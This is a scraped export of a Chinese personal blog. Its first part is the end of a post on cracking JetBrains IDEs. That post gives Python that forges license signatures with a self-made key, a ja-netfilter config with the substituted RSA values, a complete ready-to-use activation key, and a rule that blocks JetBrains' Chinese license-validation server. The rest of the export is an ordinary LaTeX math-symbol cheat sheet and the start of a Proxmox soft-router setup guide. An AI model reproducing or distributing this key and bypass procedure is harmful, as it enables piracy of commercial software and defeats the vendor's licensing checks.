x509.load_der_x509_certificate(base64.b64decode(certBase64)) public_key = cert.public_key() sign = int.from_bytes(cert.signature, byteorder=\u0026#34;big\u0026#34;, ) print(f\u0026#34;sign:{sign}\u0026#34;) modBits = public_key.key_size digest_cert = SHA256.new(cert.tbs_certificate_bytes) r = int.from_bytes(pkcs15_encode(digest_cert, ceil_div(modBits, 8)), byteorder=\u0026#39;big\u0026#39;, signed=False) print(f\u0026#34;result:{r}\u0026#34;) licenseId = \u0026#39;R7FP0YWA38\u0026#39; licensePart = \u0026#39;{\u0026#34;licenseId\u0026#34;:\u0026#34;R7FP0YWA38\u0026#34;,\u0026#34;licenseeName\u0026#34;:\u0026#34;Braindance\u0026#34;,\u0026#34;assigneeName\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;assigneeEmail\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;licenseRestriction\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;checkConcurrentUse\u0026#34;:false,\u0026#34;products\u0026#34;:[{\u0026#34;code\u0026#34;:\u0026#34;DPN\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;DB\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;PS\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;II\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;RSC\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true},{\u0026#34;code\u0026#34;:\u0026#34;GO\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;DM\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;RSF\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true},{\u0026#34;code\u0026#34;:\u0026#34;DS\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;PC\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;RC\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;CL\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;WS\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;RD\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;RS0\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;RM\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;AC\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;RSV\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true},{\u0026#34;code\u0026#34;:\u0026#34;DC\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;RSU\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:false},{\u0026#34;code\u0026#34;:\u0026#34;DP\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true},{\u0026#34;code\u0026#34;:\u0026#34;PDB\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true},{\u0026#34;code\u0026#34;:\u0026#34;PWS\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true},{\u0026#34;code\u0026#34;:\u0026#34;PSI\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true},{\u0026#34;code\u0026#34;:\u0026#34;PPS\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true},{\u0026#34;code\u0026#34;:\u0026#34;PCWMP\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true},{\u0026#34;code\u0026#34;:\u0026#34;PGO\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true},{\u0026#34;code\u0026#34;:\u0026#34;PPC\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true},{\u0026#34;code\u0026#34;:\u0026#34;PRB\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true},{\u0026#34;code\u0026#34;:\u0026#34;PSW\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true},{\u0026#34;code\u0026#34;:\u0026#34;RS\u0026#34;,\u0026#34;paidUpTo\u0026#34;:\u0026#34;2077-01-01\u0026#34;,\u0026#34;extended\u0026#34;:true}],\u0026#34;metadata\u0026#34;:\u0026#34;0120211210PPAM000005\u0026#34;,\u0026#34;hash\u0026#34;:\u0026#34;28822622/0:1202205338\u0026#34;,\u0026#34;gracePeriodDays\u0026#34;:7,\u0026#34;autoProlongated\u0026#34;:false,\u0026#34;isAutoProlongated\u0026#34;:false}\u0026#39; digest = SHA1.new(licensePart.encode(\u0026#39;utf-8\u0026#39;)) with open(\u0026#39;ca.key\u0026#39;) as prifile: private_key = RSA.import_key(prifile.read()) # 使用私钥对HASH值进行签名 signature = pkcs1_15.new(private_key).sign(digest) sig_results = base64.b64encode(signature) licensePartBase64 = base64.b64encode(bytes(licensePart.encode(\u0026#39;utf-8\u0026#39;))) public_key.verify( base64.b64decode(sig_results), base64.b64decode(licensePartBase64), padding=padding.PKCS1v15(), algorithm=hashes.SHA1(), ) result = licenseId + \u0026#34;-\u0026#34; + licensePartBase64.decode(\u0026#39;utf-8\u0026#39;) + \u0026#34;-\u0026#34; + sig_results.decode(\u0026#39;utf-8\u0026#39;) + \u0026#34;-\u0026#34; + certBase64 print(result) 安装 Crypto 依赖使用 pip install pycrytodome。需要修改变量 certBase64 为第一个文件生成的 cert 证书内容（自行删除换行）。其中变量 licensePart 中的信息和变量 licenseId 对应，licenseeName 可以自行修改，code 应该就是全家桶各个软件的缩写，paidUpTo 过期时间。\n配置文件congig/power.conf 的格式\n1 2 [Result] EQUAL,sign,y,z-\u0026gt;result sign 和 result 分别对应第二个文件的两行输出，分别是签名密文、证书签名。y,z 分别是 RSA 中的指数、jetbrains内置root证书的公钥（不用修改）。最终配置文件。\n1 2 [Result] EQUAL,688827393930711928512275549698293070665686146516966052655941231404870441973710402205123355604429394140415171936010826276494797379204430556181912308828215621834023869095264591943036963130120724420798769592253168800129581361086511367675773802899334078239434964778238252446370058840916752890687348786357248109407287360623267817632253915161513374442235501450990684679388233149022805420822037547053343732736438118829252210572948271275369220730128852181626787073863828515056541044882335869396696141056207575568411139674823212977124270019967190277434142980781559286683916236429191621661925978231096547985871015033045347745040517507548703203423373963474065307957598679613534182723075187728429764246533540129748262856350129370323776549193166705032852633517719905394268849453593835332705268187404502153581134679736820933961668519544538659820375073084965933956885058156852851457008982063229683626311524790625910341414580691932545385821852904086377007435193707757250435137675275183055336401236456974574121655434382553698002922301524374402422775517514284490136029700408044713357398902530280387081498510385206614656124276242043287045844898682620475564484729941780647067683830306648941012819834344380065067184504095694554818053932782057955011188082,65537,860106576952879101192782278876319243486072481962999610484027161162448933268423045647258145695082284265933019120714643752088997312766689988016808929265129401027490891810902278465065056686129972085119605237470899952751915070244375173428976413406363879128531449407795115913715863867259163957682164040613505040314747660800424242248055421184038777878268502955477482203711835548014501087778959157112423823275878824729132393281517778742463067583320091009916141454657614089600126948087954465055321987012989937065785013284988096504657892738536613208311013047138019418152103262155848541574327484510025594166239784429845180875774012229784878903603491426732347994359380330103328705981064044872334790365894924494923595382470094461546336020961505275530597716457288511366082299255537762891238136381924520749228412559219346777184174219999640906007205260040707839706131662149325151230558316068068139406816080119906833578907759960298749494098180107991752250725928647349597506532778539709852254478061194098069801549845163358315116260915270480057699929968468068015735162890213859113563672040630687357054902747438421559817252127187138838514773245413540030800888215961904267348727206110582505606182944023582459006406137831940959195566364811905585377246353-\u0026gt;31872219281407242025505148642475109331663948030010491344733687844358944945421064967310388547820970408352359213697487269225694990179009814674781374751323403257628081559561462351695605167675284372388551941279783515209238245831229026662363729380633136520288327292047232179909791526492877475417113579821717193807584807644097527647305469671333646868883650312280989663788656507661713409911267085806708237966730821529702498972114194166091819277582149433578383639532136271637219758962252614390071122773223025154710411681628917523557526099053858210363406122853294409830276270946292893988830514538950951686480580886602618927728470029090747400687617046511462665469446846624685614084264191213318074804549715573780408305977947238915527798680393538207482620648181504876534152430149355791756374642327623133843473947861771150672096834149014464956451480803326284417202116346454345929350148770746553056995922154382822307758515805142704373984019252210715650875853634697920708113806880196144197384637328982263167395073688501517286678083973976140696077590122053014085412828620051470085033364773099146103525313018873319293728800442101520384088109603555959893639842091339193872012790186223768662175794579863414151470043973965016829149915484844451483261 激活key\n1 R7FP0YWA38-eyJsaWNlbnNlSWQiOiJSN0ZQMFlXQTM4IiwibGljZW5zZWVOYW1lIjoiQnJhaW5kYW5jZSIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IkRQTiIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiREIiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlBTIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJJSSIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUlNDIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkdPIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJETSIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUlNGIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkRTIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJQQyIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUkMiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IkNMIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJXUyIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUkQiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlJTMCIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUk0iLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IkFDIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJSU1YiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiREMiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlJTVSIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiRFAiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUERCIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBXUyIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQU0kiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBTIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBDV01QIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBHTyIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUEMiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFJCIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBTVyIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVk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 应该可以直接使用我上面的配置，自己生成也可以。重启软件激活\n2024年10月21日发现了个新问题。参照[博客][https://www.cnblogs.com/airlongdianblog/p/18418285]\n2024.2后jetbrains新的安装程序自带了三个区域语言包，其中若选择中文大陆区域语言包，会将激活验证服务器地址修改为国内新验证地址。而jetbra/ja-netfaliter的拦截是黑名单制度，该新服务器地址并不在原本的拦截列表中。\n这时激活失效并且会不断弹窗，只需要在config/url.conf中加入拦截域名，重新启动即可。\n1 PREFIX,https://account.jetbrains.com.cn/lservice/rpc/validateKey.action 上面文章内容已经添加了。\n","date":"2023-08-30T00:00:00Z","permalink":"https://www.braindance.top/articles/2023/08/jetbrains-%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/","title":"JetBrains 全家桶破解"},{"content":"https://blog.csdn.net/m0_55746113/article/details/122728673\n标注符号 上下标 上标符号为“^”、下标符号为“_” ，多于一个字符用{}包含，例如2^r、a_5\n$2^r,a_5,A_{n+1}$\n平均值、箭头、向量等 加^号：\\hat{x}\n加横线：\\overline{x}\n加^：\\widehat{x}\n加波浪线：\\widetilde{x}\n加一个点：\\dot{x}\n加两个点：\\ddot{x}\n$\\hat x,\\overline x,\\widehat x,\\widetilde x,\\dot x,\\ddot x$\n加粗 矩阵字母一般会用加粗的罗马体来表示。\\bf\n根号 \\sqrt{}\n希腊字母表 运算符号 加减乘除 + 和 -。\\times 和 \\div。点乘用 \\cdot\n$ +,-,\\times,\\div,\\cdot$\n大于、小于、约等于 大于小于直接 \u0026gt; 、 \u0026lt;\n大于等于 \\ge，小于等于 \\le\n远大于 \\gg，远小于 \\ll\n不等于 \\ne\n约等于 \\approx\n$\u0026gt;,\u0026lt;,\\ge,\\le,\\gg,\\ll,\\ne,\\approx$\n分式和根式 \\frac{分子}{分母}或\\frac 分子 分母。如\n$ \\frac{1}{2}$\n交集并集 交集用 \\cap\n并集用 \\cup\n$\\cap,\\cup$\n属于不属于 属于用 \\in\n不属于用 \\notin\n$\\in,\\notin$\n省略号 横向省略号 \\cdots\n垂直省略号 \\vdots\n斜向省略号 \\ddots\n$\\cdots, \\vdots , \\ddots $\n求和与求积 求和用 \\sum\n求积（product）用 \\prod\n可以用\\limits来强制显示在下方。\n$\\sum,\\prod,\\sum_i,\\sum \\limits_{i=1}^N,\\prod_{i=1}^N x_i$\n标注符号 括号 小括号直接 ()，中括号直接 []，大括号 \\{\\}。\n左向上取整 \\lceil，右向上取整 \\rceil\n$\\lceil ,\\rceil $\n左向下取整 \\lfloor，右向下取整 \\rfloor\n$\\lfloor ,\\rfloor $\n绝对值用||\n下方加符号 在任意符号下面加符号 \\underset{}{}。例如 \\underset{B}{A}。在下方换行使用 \\substack{}。\n$\\underset{B}{A}，\\underset{\\substack{B\u0026gt;0 \\ C\u0026lt;0}}{A}$\n花体符号 傅里叶变换中的f用 \\mathcal\n$\\mathcal f,\\mathcal L,\\mathcal G$\n多行公式 使用 \\\\ 来换行，使用 \\begin{align}、\\end{align} 环绕表示多行环境。多行环境\\\\默认右对齐，如果想要使某个符号对齐，需要在符号前加 \u0026amp;，例如=号前面\n$ \\begin{align} a\u0026amp;=b+c+d \\ \u0026amp;=e+f \\end{align}$ $$ \\begin{align} a\u0026=b+c+d \\\\ \u0026=e+f \\end{align} $$","date":"2023-05-21T00:00:00Z","permalink":"https://www.braindance.top/articles/2023/05/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/","title":"LaTex数学公式"},{"content":"前言 在学校疫情期间买了一个 j4125 的软路由，一直等到回家过了很久才到手，因为买的是裸机，还有些配件是在别的店买的，回家以后发现地址只能在区以内修改，只能取消订单重新下了单。\n最后的配件列表如下：\nDDR4 8G * 2 128G msata * 1 金士顿 480G sata * 1 （送的有sata的电源线和数据线，要注意下电源线用那种带拐角的，不然不好插上去） DV 12V5A 电源 5.5mm 原来咸鱼上买了假三星内存条回来插上发现不能用，所以把笔记本上的两根 8G 换下来了，然后又觉得电脑单根有点卡，所以又下了一单，哈哈哈现在电脑上是假三星 32G。电源是发货最慢的，我把家里路由器机顶盒的电源找了个遍，发现都插不上去，重要的是同样是圆口的插孔，还分好多不一样的尺寸，这个是最大的 5.5mm 的，最后出去找了一家买监控的店，在压箱货里面找到了一个非常非常塑料感的电源，卖了我 30 块，我现在还记得我进去的时候老板正在玩魔兽骑着坐骑跑路。\n再安利两个视频，我前期了解主要通过这两个 up 的视频学习的。\n保姆级J4125英特尔2.5G安装PVE+Ikuai+Openwrt\n用U盘直接给J4125软路由安装OpenWrt固件，超简单小白也看得懂\n准备材料 需要准备：\nU盘一个。制作引导盘，安装完成以后可以恢复 键盘。安装向导需要一些配置 网线。安装完成以后可以访问 web页面配置 软件安装包：\nRestful。官网：http://rufus.ie/zh/ pve镜像。官网：https://www.proxmox.com/en/downloads。要下载名称有 ISO Installer 才是系统镜像文件 Restful 制作安装 插上U盘，打开 Restful 写入镜像文件，设备选择U盘盘符，引导类型选择镜像文件，然后右边选择下载好的 PVE 镜像文件，其他的配置默认即可。\n确认以后会有一个弹窗选择 DD 镜像模式写入。用个网上找的图片\n引导盘算制作好了。如果引导盘安装完成以后想要恢复成原来U盘，插上U盘，注意一下识别的盘符，引导类型选择为非可引导重新格式化一下即可，文件系统 FAT32 不能写入超过 2G 大小的文件，所以我一般选 NTFS。\n虚拟机网段规划分配 因为安装的时候需要配置 PVE 网络的网关，既然用了软路由肯定是要用 OpenWrt、爱快这种路由系统装到虚拟机里，所以在安装之前先规划一下虚拟机的 IP 分配问题。以我安装的 OpenWrt 为例。\n我打算把软路由作为旁路由使用，不会影响家里爸妈用网体验，自己只需要本地改一下 WIFI 的网关为软路由地址即可。因为我家的入户路由所在的 IP 段是 192.168.1.0/24 ，所以我选择一个其他的网段如 192.168.5.0/24，避免和主路由所在的网段搞混。选择 PVE 系统的 IP 为 192.168.5.2，OpenWrt 虚拟机的 IP 为 192.168.5.3，其他虚拟机顺延。所以在安装 PVE 系统的时候网关需要填为 OpenWrt 准备的虚拟机地址 192.168.5.3，PVE 地址也需要修改为对应的。\n所以最后的结果就是：\nPVE 主系统：192.168.5.2\nOpenWrt：192.168.5.3\nXbantu：192.168.5.4\n\u0026hellip;\u0026hellip;\n如果是直接作为主路由拨号使用，网关同样要填上 OpenWrt 的地址，因为要用 OpenWrt 拨号。\n安装 PVE 系统 U盘插上软路由，注意一下启动界面提示的进入 BIOS 界面的按键，我的是 F7，如果不一样问客服或者搜一搜。选择U盘作为引导盘启动安装系统，找一下自己的U盘名称。\n接下来进入PVE的安装界面。我已经装好系统了没图，可以看着上面推荐的视频里来，界面依次是：\n选择默认的硬盘。 输入国家、时区、键盘语言。 设置管理员的密码、确认密码，设置邮箱。 这个邮箱我暂时还没有用到，可能 PVE 官方远程管理用得上，先填一个能使用的吧。\n设置管理网卡口、域名、虚拟机 IP 段、网关、DNS。 网卡的选择是用于管理 PVE 虚拟机的网卡。比如我的软路由有四个物理网卡，我选择其中一个物理插上网线用来管理 PVE 及其虚拟机，其他三个物理网卡分配给其他虚拟机使用，通常是不可以直接访问 PVE 管理面板的。下拉列表有网卡真实的 MAC 地址，看最后两位一般是有顺序的，我也是大致对应软路由上的物理网口，应该是从小到大吧，我选择了第四个最后一个网口最为 PVE 的管理网口。\n域名可能和 PVE 官方的远程管理有关。虚拟机 IP 段就是 PVE 管理的虚拟机可获得的 IP 范围。DNS 不多说了。\n网关的设置，在虚拟机网段规划分配章节中有说明，填上。\n确认填写信息 确认安装后稍等一段时间，PVE 会自动重启，系统选择 Proxmox VE GUN/Linux，之后会进入 PVE 系统的登陆页面。\n登陆的用户名是 root，密码是刚刚安装时填写的密码。上面的信息是 PVE 的 Web 控制台地址，图中的地址可能和我的不一样，这个和前面设置的 IP 段有关。\n连接 PVE 主机 安装完成以后，使用网线连接软路由，并配置自己电脑的有线网卡保证和软路由在同一个网段。比如我前面规划我的 IP 网段为 192.168.5.0/24，电脑随便填一个不会冲突的 IP，网关和 DNS 可以填为 OpenWrt 预留的地址。\n之后可以直接访问安装成功时提示的 PVE Web 控制台地址和端口，即使没有证书也要使用 https 访问，浏览器高级选项中有继续访问。用户名是 root 密码就是安装时填写的。下面可以选择语言为简体中文。可能会有一个其他提示直接跳过即可。\n一些配置 为了方便一些虚拟机可以直通硬件设备，比如 NAS 直通硬盘，提高工作效率，所以需要对 PVE 设置并开启硬件直通。\n前面步骤连上软路由，使用 Shell 连接 PVE 系统，以上面为例地址为 192.168.5.2，用户名密码同上面。虚拟的相关技术不太懂，本人也是跟着操作的。\n偶然发现一篇文章讲了一些相关内容，内核大佬请看 [转]关于Linux grub配置iommu=pt intel_iommu=on\nPVE直通特性功能 注意 Intel 和 AMD 的CPU 一些参数不一样，我使用的 J4125 是 Intel 的。修改的文件都是 /etc/default/grub ，需要修改的参数是 GRUB_CMDLINE_LINUX_DEFAULT，默认值应该是\n1 GRUB_CMDLINE_LINUX_DEFAULT=\u0026#34;quiet\u0026#34; 根据 CPU 不同需要修改成\nIntel CPU 1 GRUB_CMDLINE_LINUX_DEFAULT=\u0026#34;quiet intel_iommu=on iommu=pt\u0026#34; AMD CPU 1 